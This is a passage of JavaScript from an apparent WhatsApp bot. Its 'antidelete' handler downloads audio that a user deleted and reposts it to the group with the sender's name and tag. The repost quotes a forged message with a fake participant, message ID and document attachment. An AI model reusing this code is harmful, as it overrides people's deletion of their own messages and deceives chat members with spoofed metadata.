				const savedFilename = await benny.downloadAndSaveMediaMessage(int.data, `./src/${filename}`);
				const buff = fs.readFileSync(savedFilename)
				const strConversation =  `*╔❏* *ANTIDELETE*\n*║*\n*╠❏* Nama : ${pushname}\n*╠❏* Tag: @${sender.replace('@s.whatsapp.net', '')}\n*╠❏* Tipe : Audio\n*╠❏* Pesan: ${body ? body : '-'}\n*╚❏* Waktu: ${moment.unix(int.timestamp).format('HH:mm:ss DD/MM/YYYY')}`
                         benny.sendMessage(from, buff, MessageType.audio, { contextInfo: {mentionedJid: [sender, botNumber]}, filename: `${pushname}`, mimetype: 'audio/mp4', quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buffer, "mimetype": "application/octet-stream", "title": `${fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${fake}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
                   fs.unlinkSync(savedFilename)
                         
                    }
               }
	} catch (e) {
		console.log('Message : %s', color(e, 'green'))
		// console.log(e)
	}
})
